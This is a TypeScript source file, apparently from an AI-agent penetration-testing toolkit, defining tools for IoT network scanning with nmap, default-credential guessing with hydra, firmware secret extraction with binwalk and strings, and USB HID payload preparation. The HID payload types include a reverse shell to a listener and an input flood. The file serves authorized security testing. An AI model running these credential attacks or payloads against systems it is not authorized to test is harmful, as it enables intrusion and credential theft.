	for (const action of params.payload.actions) {
		const modifierNames = action.modifiers
			.map((usage) => (usage === 0xe0 ? "ctrl" : usage === 0xe1 ? "shift" : usage === 0xe2 ? "alt" : "gui"))
			.join("+");
		out.push(
			`# ${action.label.padEnd(7)} 0x${action.code.toString(16).padStart(2, "0")}    ${(modifierNames || "-").padEnd(10)} ${hidFrame(action)}`,
		);
	}

	out.push("");
	out.push(`# Payload frames: ${params.payload.actions.length}`);
	params.payload.actions.forEach((action, index) => {
		out.push(`# ${String(index + 1).padStart(4)}  ${action.label.padEnd(10)} ${hidFrame(action)}`);
	});

	if (params.payloadType === "badge") {
		out.push("");
		out.push("# Badge field layout (Wiegand 26 bit, hex encoded)");
		out.push("#   badge id : 0x00<id>      (lowercase hex, 4 to 8 nibbles)");
		out.push("#   parity   : even parity over the payload, LSB first");
	}

	out.push("");
	out.push(`# Payload script: ${params.scriptPath}`);
	out.push("# This report describes the payload only. No HID device was programmed.");
	out.push("");
	return out.join("\n");
}

// ---------------------------------------------------------------------------
// Tools
// ---------------------------------------------------------------------------

/** Prompt guideline shared by the three IoT tools. */
const IOT_GUIDELINE =
	"These tools operate on physical or embedded devices the operator is authorized to test; " +
	"cyber_hid_attack defaults to dry_run and only generates artifacts, it never programs a device.";

export const iotTools: ToolDefinition[] = [
	defineCyberTool({
		name: "cyber_iot_scan",
		label: "IoT device scan",
		description:
			"Discover and fingerprint IoT and embedded devices on a scoped range with nmap -sV, " +
			"and optionally test the discovered telnet/HTTP services against a list of well-known " +
			"device default credentials.",
		promptSnippet: "cyber_iot_scan: discover and fingerprint IoT devices on a scoped range",
		promptGuidelines: [IOT_GUIDELINE],
		technique: "iot-hardware",
		requires: ["nmap"],
		installHint: "Install nmap on Kali with: sudo apt install -y nmap",
		parameters: Type.Object({
			target: Type.String({ description: "Scoped CIDR block or host range to scan, e.g. 192.168.1.0/24" }),
			ports: Type.Optional(
				Type.String({
					description: "Comma separated port list or ranges",
					default: DEFAULT_IOT_PORTS,
				}),
			),
			timeout_minutes: Type.Optional(
				Type.Number({ description: "Maximum minutes for the scan", default: 5 }),
			),
			default_credential_check: Type.Optional(
				Type.Boolean({ description: "Test discovered services against a default credential list", default: false }),
			),
			list_path: Type.Optional(
				Type.String({ description: "Credential list file, one user:pass per line" }),
			),
		}),
		execute: async (params, ctx): Promise<CyberToolOutcome<IotScanDetails>> => {
			const cwd = ctx.cwd;
			const paths = engagementPaths(cwd);
			const target = params.target.trim();
			const ports = (params.ports ?? DEFAULT_IOT_PORTS).trim();
			const minutes = Math.max(1, Math.min(Math.round(params.timeout_minutes ?? 5), 120));
			const artifacts: string[] = [];
			const notes: string[] = [];
			const commands: string[] = [];

			if (!/^\d+(-\d+)?(,\d+(-\d+)?)*$/.test(ports)) {
				return {
					summary: `Invalid port list: ${ports}. Use comma separated ports or ranges, e.g. 23,80,8080-8090.`,
					isError: true,
				};
			}

			const nmapArgs = [
				"-sV",
				"-Pn",
				"-p",
				ports,
				"--open",
				"--host-timeout",
				`${minutes}m`,
				"--max-retries",
				"1",
				"-T4",
				"-oX",
				"-",
			];
			if (isIpTarget(target)) nmapArgs.push("-n");
			nmapArgs.push(target);

			const nmap = await run("nmap", nmapArgs, {
				cwd,
				timeoutMs: minutes * 60_000 + 30_000,
				artifactDir: paths.artifacts,
				artifactName: `iot-nmap-${slug(target)}.xml`,
			});
			if (nmap.artifact) artifacts.push(nmap.artifact);
			commands.push(nmap.cmd);

			const devices = parseNmapXml(nmap.stdout);
			if (nmap.code !== 0 && devices.length === 0) {
				return {
					summary: `nmap failed on ${target} (exit ${nmap.code}): ${nmap.stderr.trim() || "no output"}`,
					details: { target, ports, devices: [], defaultCredentials: [], artifacts, notes },
					isError: true,
				};
			}
			if (nmap.code !== 0) {
				notes.push(`nmap exited with code ${nmap.code}; the results below may be partial.`);
			}

			const defaultCredentials: IotScanDetails["defaultCredentials"] = [];
			const wantsCredentials = params.default_credential_check === true;
			const listPath = params.list_path ? path.resolve(cwd, params.list_path) : DEFAULT_CRED_LIST;
			const listExists = fs.existsSync(listPath);
			if (!listExists && (wantsCredentials || params.list_path !== undefined)) {
				notes.push(`default credential list not found at ${listPath}.`);
			}

			if (wantsCredentials) {
				if (!listExists) {
					notes.push("the default credential check was skipped because the list file is missing.");
				} else if (!which("hydra")) {
					notes.push("hydra is not installed; default credential check skipped (sudo apt install -y hydra).");
				} else {
					const candidates: Array<{ device: IotDeviceDetail; service: IotServiceDetail; module: string }> = [];
					for (const device of devices) {
						for (const service of device.services) {
							const module = hydraModule(service);
							if (!module) continue;
							candidates.push({ device, service, module });
							if (candidates.length >= MAX_CRED_TARGETS) break;
						}
						if (candidates.length >= MAX_CRED_TARGETS) break;
					}
					if (candidates.length === 0) {
						notes.push("no telnet or HTTP service was discovered, so no default credential test was run.");
					}
					if (candidates.length >= MAX_CRED_TARGETS) {
						notes.push(`only the first ${MAX_CRED_TARGETS} services were tested against the default credential list.`);
					}
					for (const candidate of candidates) {
						const args = ["-C", listPath, "-t", "4", "-s", candidate.device.ip, "-p", String(candidate.service.port)];
						if (candidate.module === "telnet") args.push("-f");
						args.push(candidate.module);
						const hydra = await run("hydra", args, {
							cwd,
							timeoutMs: 180_000,
							artifactDir: paths.artifacts,
							artifactName: `iot-hydra-${slug(candidate.device.ip)}-${candidate.service.port}.txt`,
						});
						if (hydra.artifact) artifacts.push(hydra.artifact);
						commands.push(hydra.cmd);
						const credential = parseHydraSuccess(hydra.stdout);
						if (!credential) continue;
						defaultCredentials.push({
							ip: candidate.device.ip,
							port: candidate.service.port,
							service: candidate.module,
							credential,
						});
					}
				}
			} else {
				notes.push("default credential check was not requested (set default_credential_check to true).");
			}

			const serviceCount = devices.reduce((total, device) => total + device.services.length, 0);
			const summary =
				`IoT scan of ${target}: ${devices.length} device(s), ${serviceCount} open service(s)` +
				(defaultCredentials.length > 0
					? `, ${defaultCredentials.length} accepted a default credential`
					: "");

			const out: string[] = [];
			out.push(`Target: ${target}`);
			out.push(`Ports:  ${ports}`);
			out.push("");
			if (devices.length === 0) {
				out.push("No devices answered on the scanned ports.");
			}
			for (const device of devices) {
				const names = device.hostnames.length > 0 ? ` [${device.hostnames.join(", ")}]` : "";
				out.push(`${device.ip}${names}`);
				for (const service of device.services) {
					const vendor = service.vendor ? `  vendor: ${service.vendor}` : "";
					out.push(`  ${String(service.port).padStart(5)}/${service.protocol}  ${serviceLabel(service)}${vendor}`);
				}
				for (const [key, value] of Object.entries(device.scripts)) {
					out.push(`  script ${key}: ${value}`);
				}
			}
			if (defaultCredentials.length > 0) {
				out.push("");
				out.push("Default credentials accepted:");
				for (const entry of defaultCredentials) {
					out.push(`  ${entry.ip}:${entry.port} (${entry.service})  ${entry.credential}`);
				}
			}
			if (notes.length > 0) {
				out.push("");
				out.push("Notes:");
				for (const note of notes) out.push(`  - ${note}`);
			}
			if (commands.length > 0) {
				out.push("");
				out.push("Commands:");
				for (const command of commands) out.push(`  ${command}`);
			}
			if (artifacts.length > 0) {
				out.push("");
				out.push("Artifacts:");
				for (const artifact of artifacts) out.push(`  ${artifact}`);
			}

			return {
				summary,
				output: out.join("\n"),
				severity: defaultCredentials.length > 0 ? "high" : "info",
				details: { target, ports, devices, defaultCredentials, artifacts, notes },
			};
		},
	}),
	defineCyberTool({
		name: "cyber_firmware_analysis",
		label: "Firmware analysis",
		description:
			"Identify and carve the contents of a firmware image with binwalk, then run strings over " +
			"the largest extracted filesystem to surface embedded credentials, keys and URLs.",
		promptSnippet: "cyber_firmware_analysis: carve a firmware image and look for embedded secrets",
		promptGuidelines: [IOT_GUIDELINE],
		technique: "iot-hardware",
		requires: ["binwalk", "strings"],
		installHint: "Install binwalk and binutils on Kali with: sudo apt install -y binwalk binutils",
		parameters: Type.Object({
			file: Type.String({ description: "Path to the firmware image" }),
			extract_dir: Type.Optional(Type.String({ description: "Directory to carve the image into" })),
			strings_limit: Type.Optional(
				Type.Number({ description: "Maximum number of interesting strings to report", default: 40 }),
			),
		}),
		execute: async (params, ctx): Promise<CyberToolOutcome<FirmwareDetails>> => {
			const cwd = ctx.cwd;
			const paths = engagementPaths(cwd);
			const file = path.resolve(cwd, params.file);
			const limit = Math.max(1, Math.min(Math.round(params.strings_limit ?? 40), 500));
			const artifacts: string[] = [];
			const notes: string[] = [];
			const commands: string[] = [];

			if (!fs.existsSync(file)) {
				return {
					summary: `Firmware image not found: ${file}`,
					details: {
						file,
						sizeBytes: 0,
						architecture: "unknown",
						filesystems: [],
						types: [],
						extractDir: "",
						interestingStrings: [],
						artifacts,
						notes,
					},
					isError: true,
				};
			}
			let sizeBytes = 0;
			try {
				const stat = fs.statSync(file);
				if (!stat.isFile()) {
					return {
						summary: `Not a firmware file: ${file}`,
						details: {
							file,
							sizeBytes: 0,
							architecture: "unknown",
							filesystems: [],
							types: [],
							extractDir: "",
							interestingStrings: [],
							artifacts,
							notes,
						},
						isError: true,
					};
				}
				sizeBytes = stat.size;
			} catch (error) {
				return {
					summary: `Cannot read firmware image ${file}: ${(error as Error).message}`,
					isError: true,
				};
			}

			const base = path.basename(file);
			const extractDir = params.extract_dir
				? path.resolve(cwd, params.extract_dir)
				: path.join(paths.artifacts, "firmware", base);
			try {
				fs.mkdirSync(extractDir, { recursive: true });
			} catch (error) {
				return {
					summary: `Cannot create extraction directory ${extractDir}: ${(error as Error).message}`,
					isError: true,
				};
			}

			const analysis = await run("binwalk", [file], {
				cwd,
				timeoutMs: 180_000,
				artifactDir: paths.artifacts,
				artifactName: `firmware-${slug(base)}-binwalk.txt`,
			});
			if (analysis.artifact) artifacts.push(analysis.artifact);
			commands.push(analysis.cmd);
			const types = parseBinwalkTypes(analysis.stdout);
			if (analysis.code !== 0 && types.length === 0) {
				return {
					summary: `binwalk could not identify ${file} (exit ${analysis.code}): ${analysis.stderr.trim() || "no output"}`,
					details: {
						file,
						sizeBytes,
						architecture: "unknown",
						filesystems: [],
						types: [],
						extractDir,
						interestingStrings: [],
						artifacts,
						notes,
					},
					isError: true,
				};
			}

			const carve = await run("binwalk", ["-e", "-C", extractDir, file], {
				cwd,
				timeoutMs: 900_000,
				artifactDir: paths.artifacts,
				artifactName: `firmware-${slug(base)}-carve.txt`,
			});
			if (carve.artifact) artifacts.push(carve.artifact);
			commands.push(carve.cmd);
			if (carve.code !== 0) {
				notes.push(`binwalk carving exited with code ${carve.code}; the output directory may be incomplete.`);
			}

			const architecture = detectArchitecture(types);
			const filesystems = detectFilesystems(types);

			const largest = largestFile(extractDir);
			const stringsTarget = largest?.file ?? file;
			if (!largest) {
				notes.push(`binwalk carved no files; strings was run over the original image ${base}.`);
			}

			const stringsRun = await run("strings", ["-n", "8", stringsTarget], {
				cwd,
				timeoutMs: 300_000,
				artifactDir: paths.artifacts,
				artifactName: `firmware-${slug(base)}-strings.txt`,
			});
			if (stringsRun.artifact) artifacts.push(stringsRun.artifact);
			commands.push(stringsRun.cmd);

			const interesting: string[] = [];
			for (const line of lines(stringsRun.stdout)) {
				if (!isInterestingString(line)) continue;
				interesting.push(redactLine(line));
				if (interesting.length >= limit) break;
			}
			if (interesting.length >= limit) {
				notes.push(`showing the first ${limit} interesting strings; the full output is in the artifact file.`);
			}

			const summary =
				`Firmware analysis of ${base} (${formatBytes(sizeBytes)}): architecture ${architecture.name}` +
				(filesystems.length > 0 ? `, filesystems ${filesystems.join(", ")}` : "") +
				`, ${interesting.length} interesting string(s)`;

			const out: string[] = [];
			out.push(`Image:        ${file} (${formatBytes(sizeBytes)})`);
			out.push(`Architecture: ${architecture.name}${architecture.evidence ? `  [${architecture.evidence}]` : ""}`);
			out.push(`Filesystems:  ${filesystems.length > 0 ? filesystems.join(", ") : "none identified"}`);
			out.push(`Carve output: ${extractDir}`);
			out.push(
				`Strings on:   ${stringsTarget}${largest ? ` (${formatBytes(largest.size)}, largest extracted file)` : ""}`,
			);
			if (types.length > 0) {
				out.push("");
				out.push("Detected file types:");
				for (const entry of types.slice(0, 20)) {
					out.push(`  ${entry.offset.padStart(10)}  ${entry.hexOffset.padStart(10)}  ${entry.description}`);
				}
				if (types.length > 20) out.push(`  ... ${types.length - 20} more signatures in the artifact file`);
			}
			out.push("");
			out.push(`Interesting strings (${interesting.length}, redacted):`);
			for (const line of interesting) out.push(`  - ${line}`);
			if (notes.length > 0) {
				out.push("");
				out.push("Notes:");
				for (const note of notes) out.push(`  - ${note}`);
			}
			if (commands.length > 0) {
				out.push("");
				out.push("Commands:");
				for (const command of commands) out.push(`  ${command}`);
			}
			out.push("");
			out.push("Artifacts:");
			for (const artifact of artifacts) out.push(`  ${artifact}`);

			return {
				summary,
				output: out.join("\n"),
				severity: interesting.length > 0 ? "medium" : "info",
				details: {
					file,
					sizeBytes,
					architecture: architecture.name,
					architectureEvidence: architecture.evidence,
					filesystems,
					types,
					extractDir,
					largestFile: largest?.file,
					largestFileSize: largest?.size,
					stringsArtifact: stringsRun.artifact,
					interestingStrings: interesting,
					artifacts,
					notes,
				},
			};
		},
	}),
	defineCyberTool({
		name: "cyber_hid_attack",
		label: "HID payload preparation",
		description:
			"Prepare a USB HID payload: generate a hidrd-style keycode report and the matching " +
			"payload script for the chosen operating system. The tool only writes artifacts; it " +
			"never programs a device, and it defaults to a dry run. The payload text supports " +
			"key tokens such as <ENTER>, <TAB>, <ESC>, <BACKSPACE>, <SPACE>, <F1>-<F12>, " +
			"<UP>, <DOWN>, <LEFT>, <RIGHT>, <HOME>, <END> and the modifiers <CTRL>, <ALT>, " +
			"<SHIFT> and <GUI>, which apply to every key that follows them.",
		promptSnippet: "cyber_hid_attack: prepare a USB HID payload report and script",
		promptGuidelines: [IOT_GUIDELINE],
		technique: "iot-hardware",
		parameters: Type.Object({
			payload_type: Type.Union(
				[
					Type.Literal("keystrokes"),
					Type.Literal("shell-payload"),
					Type.Literal("badge"),
					Type.Literal("dos"),
				],
				{
					description:
						"Kind of HID payload to prepare: keystrokes types text, shell-payload opens a shell " +
						"back to a listener, badge types a badge identifier, dos is a bounded input-flood " +
						"resilience test",
				},
			),
			payload: Type.Optional(
				Type.String({
					description:
						"Text to type; required for the keystrokes payload type. Supports <ENTER> style key tokens",
				}),
			),
			target_os: Type.Optional(
				Type.Union([Type.Literal("windows"), Type.Literal("linux"), Type.Literal("macos")], {
					description: "Operating system the payload script targets",
					default: "windows",
				}),
			),
			output_file: Type.Optional(Type.String({ description: "Where to write the payload script" })),
			delay_ms: Type.Optional(Type.Number({ description: "Delay between keystrokes in milliseconds", default: 0 })),
			dry_run: Type.Optional(
				Type.Boolean({
					description: "Only generate artifacts and run nothing; when false the script is run locally",
					default: true,
				}),
			),
		}),
		execute: async (params, ctx): Promise<CyberToolOutcome<HidDetails>> => {
			const cwd = ctx.cwd;
			const paths = engagementPaths(cwd);
			const payloadType = params.payload_type;
			const targetOs = params.target_os ?? "windows";
			const delayMs = Math.max(0, Math.round(params.delay_ms ?? 0));
			const dryRun = params.dry_run !== false;
			const artifacts: string[] = [];
			const notes: string[] = [];

			if (payloadType === "keystrokes" && (params.payload === undefined || params.payload.length === 0)) {
				return {
					summary: "The keystrokes payload type requires the payload parameter with the text to type.",
					isError: true,
				};
			}

			const rawPayload =
				payloadType === "keystrokes"
					? (params.payload ?? "")
					: payloadType === "badge"
						? (params.payload ?? "BADGE-ID")
						: payloadType === "dos"
							? (params.payload ?? "AAAAAAAA")
							: "";

			const parsed = parseHidPayload(rawPayload);
			if (parsed.unsupported.length > 0) {
				notes.push(
					`unsupported payload tokens were skipped: ${[...new Set(parsed.unsupported)].join(", ")}`,
				);
			}
			if (payloadType === "keystrokes" && parsed.actions.length === 0) {
				return {
					summary: "The payload contains no character that can be mapped to a HID keycode.",
					isError: true,
				};
			}

			const extension = targetOs === "windows" ? "ps1" : "sh";
			const scriptPath = params.output_file
				? path.resolve(cwd, params.output_file)
				: path.join(paths.artifacts, "hid", `${payloadType}-${targetOs}.${extension}`);
			const parsedPath = path.parse(scriptPath);
			const reportPath = path.join(parsedPath.dir, `${parsedPath.name}-hid-report.txt`);

			let script: string;
			if (payloadType === "keystrokes") {
				script =
					targetOs === "windows"
						? windowsPayloadScript(parsed.segments, delayMs)
						: targetOs === "macos"
							? macosPayloadScript(parsed.segments, delayMs)
							: linuxPayloadScript(parsed.segments, delayMs);
			} else if (payloadType === "shell-payload") {
				script = shellPayloadScript(targetOs);
			} else if (payloadType === "badge") {
				script = badgePayloadScript(parsed.segments, targetOs, delayMs);
			} else {
				script = dosPayloadScript(rawPayload, targetOs, delayMs);
			}

			const report = buildHidReport({
				payloadType,
				targetOs,
				delayMs,
				payload: parsed,
				scriptPath,
				generatedAt: new Date().toISOString(),
			});

			try {
				fs.mkdirSync(parsedPath.dir, { recursive: true });
				fs.writeFileSync(scriptPath, script, "utf8");
				fs.writeFileSync(reportPath, report, "utf8");
			} catch (error) {
				return {
					summary: `Cannot write the HID artifacts: ${(error as Error).message}`,
					isError: true,
				};
			}
			artifacts.push(scriptPath, reportPath);

			let executed: HidDetails["executed"];
			if (!dryRun) {
				const interpreter = targetOs === "windows" ? which("pwsh") ?? which("powershell") : "bash";
				if (!interpreter) {
					notes.push(
						`no interpreter for the ${targetOs} payload script was found, so it was not executed.`,
					);
				} else {
					const args = targetOs === "windows" ? ["-ExecutionPolicy", "Bypass", "-File", scriptPath] : [scriptPath];
					const result = await run(interpreter, args, { cwd, timeoutMs: 120_000 });
					executed = {
						command: result.cmd,
						code: result.code,
						stdout: result.stdout.trim(),
						stderr: result.stderr.trim(),
					};
					notes.push(
						`the payload script was executed locally (${result.cmd}); no HID device was programmed.`,
					);
				}
			}

			const summary =
				`HID ${payloadType} payload prepared for ${targetOs}: ${parsed.actions.length} keycode frame(s)` +
				(dryRun ? " (dry run, nothing executed)" : " (executed locally)");

			const out: string[] = [];
			out.push(`Payload type: ${payloadType}`);
			out.push(`Target OS:    ${targetOs}`);
			out.push(`Dry run:      ${dryRun ? "yes" : "no"}`);
			out.push(`Keycodes:     ${parsed.actions.length}`);
			if (parsed.actions.length > 0) {
				out.push("");
				out.push("Report frames:");
				for (const action of parsed.actions.slice(0, 20)) {
					out.push(`  ${action.label.padEnd(10)} ${hidFrame(action)}`);
				}
				if (parsed.actions.length > 20) {
					out.push(`  ... ${parsed.actions.length - 20} more frames in the report file`);
				}
			}
			if (executed) {
				out.push("");
				out.push(`Executed: ${executed.command} (exit ${executed.code})`);
				if (executed.stderr) out.push(`  stderr: ${executed.stderr}`);
			}
			if (notes.length > 0) {
				out.push("");
				out.push("Notes:");
				for (const note of notes) out.push(`  - ${note}`);
			}
			out.push("");
			out.push("Artifacts:");
			for (const artifact of artifacts) out.push(`  ${artifact}`);

			return {
				summary,
				output: out.join("\n"),
				severity: "info",
				details: {
					payloadType,
					targetOs,
					dryRun,
					delayMs,
					frames: parsed.actions.length,
					unsupportedTokens: [...new Set(parsed.unsupported)],
					artifacts,
					executed,
					notes,
				},
			};
		},
	}),
];
